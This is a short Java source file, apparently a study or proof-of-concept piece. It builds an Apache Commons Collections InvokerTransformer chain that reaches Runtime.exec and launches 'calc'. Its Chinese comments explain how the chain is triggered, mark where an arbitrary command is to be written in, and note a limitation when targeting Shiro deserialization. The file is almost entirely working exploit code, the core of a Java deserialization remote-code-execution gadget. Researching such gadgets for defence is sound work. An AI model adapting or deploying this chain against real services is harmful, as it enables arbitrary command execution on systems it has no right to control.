package transformer;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;

public class Chained {

    public static ChainedTransformer getChainedTransformerForRuntimeExec(){
        /*
        触发条件    ConstantTransformer.transform(任意对象)
        原理：
        直接通过InvokerTransformer调runtime exec
        ChainedTransformer 可以让多个Transformer执行transformer方法
        要注意如果是shiro用的那种反序列化不支持加载数组，这样就不太行
         */
        ConstantTransformer ct=new ConstantTransformer(Runtime.class);

        InvokerTransformer it1=new InvokerTransformer(
                "getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime",new Class[0]}
        );
        InvokerTransformer it2=new InvokerTransformer(
                "invoke",
                new Class[]{Object.class,Object[].class},
                new Object[]{"getRuntime",new Class[0]}
        );
        InvokerTransformer it_exec=new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                //这里写执行的命令
                new Object[]{"calc"}
        );
        Transformer[] a=new Transformer[]{ct,it1,it2,it_exec};
        ChainedTransformer chain=new ChainedTransformer(a);
        return chain;
    }

    public static void main(String[] args) {
        getChainedTransformerForRuntimeExec().transform(1);
    }
}
